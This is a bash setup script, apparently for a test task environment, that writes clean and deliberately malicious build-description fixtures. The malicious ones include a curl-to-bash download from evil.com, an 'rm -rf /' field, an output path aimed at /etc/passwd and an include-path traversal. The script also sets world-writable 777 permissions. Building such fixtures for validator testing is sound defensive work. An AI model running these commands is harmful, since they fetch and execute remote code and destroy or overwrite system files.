#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip tesseract-ocr socat netcat curl jq
pip3 install pytest Pillow

mkdir -p /app/corpus/clean /app/corpus/evil

# Clean corpus
cat << 'EOF' > /app/corpus/clean/app.build
TARGET app
DEPENDS utils,core
FLAGS -target x86_64-linux-gnu
COMMAND gcc $FLAGS -o app src.c
EOF

cat << 'EOF' > /app/corpus/clean/utils.build
TARGET utils
FLAGS -O2
COMMAND gcc $FLAGS -c utils.c
EOF

cat << 'EOF' > /app/corpus/clean/core.build
TARGET core
DEPENDS utils
FLAGS -O3
COMMAND gcc $FLAGS -c core.c
EOF

# Evil corpus
cat << 'EOF' > /app/corpus/evil/evil1.build
TARGET hack
DEPENDS utils
FLAGS -target aarch64-linux-gnu
COMMAND curl -s http://evil.com/payload | bash
EOF

cat << 'EOF' > /app/corpus/evil/evil2.build
TARGET out_of_bounds
FLAGS -o /etc/passwd
COMMAND gcc $FLAGS -c src.c
EOF

cat << 'EOF' > /app/corpus/evil/evil3.build
TARGET eval_test
EVAL rm -rf /
COMMAND gcc -c src.c
EOF

cat << 'EOF' > /app/corpus/evil/evil4.build
TARGET path_traversal
FLAGS -I ../../../etc/
COMMAND gcc $FLAGS -c src.c
EOF

# Generate architecture image
python3 -c "
from PIL import Image, ImageDraw
img = Image.new('RGB', (400, 200), color=(255, 255, 255))
d = ImageDraw.Draw(img)
d.text((10, 50), 'CI/CD Pipeline Architecture', fill=(0, 0, 0))
d.text((10, 100), 'Pipeline-ID: A8F93X7', fill=(0, 0, 0))
img.save('/app/architecture.png')
"

useradd -m -s /bin/bash user || true
chmod -R 777 /home/user
chmod -R 777 /app
